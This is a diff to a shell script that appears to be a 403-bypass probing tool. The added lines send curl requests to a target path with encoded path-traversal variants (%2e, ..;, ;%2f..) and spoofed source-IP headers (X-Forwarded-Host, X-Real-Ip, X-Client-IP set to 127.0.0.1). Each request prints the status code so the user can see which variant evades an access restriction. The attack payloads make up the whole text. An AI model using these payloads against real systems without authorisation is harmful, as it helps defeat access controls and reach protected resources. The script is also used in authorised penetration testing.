@@ -54,3 +54,45 @@ echo "  --> ${1}/${2};/"
 #updated
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
 echo "  --> ${1}/${2} -X TRACE"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%09
+echo "  --> ${1}/%09"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%20
+echo "  --> ${1}/%20"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%23
+echo "  --> ${1}/%23"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2e
+echo "  --> ${1}/%2e"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2f
+echo "  --> ${1}/%2f"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
+echo "  --> ${1}/."
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/..;
+echo "  --> ${1}/..;"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;09
+echo "  --> ${1}/;09"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;09..
+echo "  --> ${1}/;09.."
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;%09..;
+echo "  --> ${1}/;09..;"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;%2f..
+echo "  --> ${1}/;%2f.."
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
+echo "  --> ${1}/*"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H Client-IP: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Real-Ip: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Real-Ip: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Redirect: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H Redirect: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Client-IP: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-By: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-By: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: http://127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-Host: http://127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Port: 80" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-Port: 80"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-True-IP: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-True-IP: 127.0.0.1"
